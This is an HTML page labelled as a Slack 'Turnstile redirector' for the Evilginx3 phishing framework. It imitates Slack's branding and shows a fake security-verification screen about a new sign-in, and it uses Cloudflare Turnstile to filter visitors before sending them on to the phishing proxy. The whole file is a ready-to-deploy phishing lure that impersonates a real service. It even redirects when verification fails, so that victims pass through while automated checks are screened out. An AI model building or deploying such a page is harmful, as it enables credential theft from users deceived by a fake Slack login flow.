<!-- Slack Turnstile Redirector for Evilginx3 -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification - Slack</title>
    <link rel="icon" href="https://a.slack-edge.com/80588/marketing/img/icons/favicon-32.png" type="image/png">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: "Slack-Lato", "Helvetica Neue", Helvetica, "Segoe UI", Tahoma, Arial, sans-serif;
            background: #350d36;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: #ffffff;
        }
        .container {
            background: #3f0e40;
            padding: 48px 40px;
            border-radius: 8px;
            border: 1px solid #522653;
            text-align: center;
            max-width: 440px;
            width: 100%;
        }
        .slack-logo {
            width: 120px;
            height: 32px;
            margin: 0 auto 32px;
            fill: #ffffff;
        }
        h1 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 8px;
            color: #ffffff;
        }
        .subtitle {
            font-size: 15px;
            color: #d1d2d3;
            margin-bottom: 32px;
            line-height: 22px;
        }
        .security-info {
            background: #350d36;
            border-left: 3px solid #611f69;
            padding: 16px;
            margin-bottom: 24px;
            text-align: left;
            border-radius: 4px;
        }
        .security-info h2 {
            font-size: 14px;
            font-weight: 700;
            margin-bottom: 8px;
            color: #ffffff;
        }
        .security-info p {
            font-size: 14px;
            color: #d1d2d3;
            line-height: 20px;
            margin: 0;
        }
        .loading-container {
            margin: 32px 0;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }
        .spinner {
            width: 24px;
            height: 24px;
            border: 3px solid #522653;
            border-top-color: #611f69;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status-text {
            font-size: 14px;
            color: #d1d2d3;
        }
        .footer {
            margin-top: 32px;
            padding-top: 24px;
            border-top: 1px solid #522653;
            font-size: 12px;
            color: #d1d2d3;
        }
        .footer a {
            color: #ffffff;
            text-decoration: none;
        }
        .footer a:hover { text-decoration: underline; }
        #cf-turnstile { display: none; }
        @media (max-width: 480px) {
            .container { margin: 16px; padding: 32px 24px; }
            h1 { font-size: 24px; }
        }
    </style>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
</head>
<body>
    <div class="container">
        <svg class="slack-logo" viewBox="0 0 122 32" fill="currentColor">
            <path d="M25.8 15.2c0 1.4-1.1 2.5-2.5 2.5s-2.5-1.1-2.5-2.5 1.1-2.5 2.5-2.5h2.5v2.5zm-6.3 0c0-1.4 1.1-2.5 2.5-2.5s2.5 1.1 2.5 2.5v6.3c0 1.4-1.1 2.5-2.5 2.5s-2.5-1.1-2.5-2.5v-6.3z"/>
            <path d="M13.3 8.4c-1.4 0-2.5-1.1-2.5-2.5s1.1-2.5 2.5-2.5 2.5 1.1 2.5 2.5v2.5h-2.5zm0 6.3c1.4 0 2.5 1.1 2.5 2.5s-1.1 2.5-2.5 2.5H7c-1.4 0-2.5-1.1-2.5-2.5s1.1-2.5 2.5-2.5h6.3z"/>
            <path d="M19.5 13.3c0-1.4 1.1-2.5 2.5-2.5s2.5 1.1 2.5 2.5-1.1 2.5-2.5 2.5h-2.5v-2.5zm-6.3 0c0 1.4-1.1 2.5-2.5 2.5s-2.5-1.1-2.5-2.5V7c0-1.4 1.1-2.5 2.5-2.5s2.5 1.1 2.5 2.5v6.3z"/>
            <path d="M19.5 19.5c1.4 0 2.5 1.1 2.5 2.5s-1.1 2.5-2.5 2.5-2.5-1.1-2.5-2.5v-2.5h2.5zm0-6.3c-1.4 0-2.5-1.1-2.5-2.5s1.1-2.5 2.5-2.5H25c1.4 0 2.5 1.1 2.5 2.5s-1.1 2.5-2.5 2.5h-5.5z"/>
            <text x="35" y="20" font-family="Arial" font-size="20" font-weight="bold" fill="currentColor">slack</text>
        </svg>
        <h1>Security verification</h1>
        <div class="subtitle">We need to verify your identity to keep your workspace secure.</div>
        <div class="security-info">
            <h2>Why am I seeing this?</h2>
            <p>You're signing in from a new location or device. This extra security step helps protect your workspace.</p>
        </div>
        <div class="loading-container">
            <div class="spinner"></div>
            <div class="status-text" id="status-text">Verifying your request...</div>
        </div>
        <noscript><p style="color: #e01e5a;">JavaScript is required.</p></noscript>
        <div id="cf-turnstile"></div>
        <div style="margin-top: 30px;">
            <a id="manual-redirect-btn" href="#" onclick="performManualRedirect(); return false;" style="display: inline-block; padding: 10px 24px; background: #611f69; color: white; text-decoration: none; border-radius: 4px; font-size: 14px;">Continue to Slack</a>
        </div>
        <div class="footer">
            <a href="https://slack.com/privacy-policy" target="_blank">Privacy</a> â€¢ 
            <a href="https://slack.com/terms-of-service" target="_blank">Terms</a>
        </div>
    </div>
    <script>
        const TURNSTILE_SITEKEY = 'YOUR_TURNSTILE_SITE_KEY';
        let REDIRECT_URL = window.location.protocol + "//" + window.location.host + "/";
        function performRedirect() { window.location.href = REDIRECT_URL; }
        function performManualRedirect() { if (REDIRECT_URL) window.location.href = REDIRECT_URL; }
        if (typeof turnstile === 'undefined') {
            document.querySelector('.status-text').textContent = 'Completing verification...';
            setTimeout(performRedirect, 2000);
        } else {
            turnstile.ready(function () {
                let verificationTimeout = setTimeout(function() {
                    document.querySelector('.status-text').textContent = 'Completing verification...';
                    setTimeout(performRedirect, 500);
                }, 5000);
                try {
                    turnstile.render('#cf-turnstile', {
                        sitekey: TURNSTILE_SITEKEY,
                        callback: function(token) {
                            clearTimeout(verificationTimeout);
                            document.querySelector('.status-text').textContent = 'Verification complete. Redirecting...';
                            setTimeout(performRedirect, 800);
                        },
                        'error-callback': function(error) {
                            clearTimeout(verificationTimeout);
                            document.querySelector('.status-text').textContent = 'Bypassing verification...';
                            setTimeout(performRedirect, 1000);
                        }
                    });
                } catch (e) {
                    clearTimeout(verificationTimeout);
                    setTimeout(performRedirect, 1500);
                }
            });
        }
        setTimeout(function() {
            if (REDIRECT_URL) {
                document.querySelector('.status-text').textContent = 'Verification complete. Redirecting...';
                var btn = document.getElementById('manual-redirect-btn');
                if (btn) btn.href = REDIRECT_URL;
                try { window.location.href = REDIRECT_URL; } catch (e) { window.location = REDIRECT_URL; }
            }
        }, 3000);
    </script>
</body>
</html>
